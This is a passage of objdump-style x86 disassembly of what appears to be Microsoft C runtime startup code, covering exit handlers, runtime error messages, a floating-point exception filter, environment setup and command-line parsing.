  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
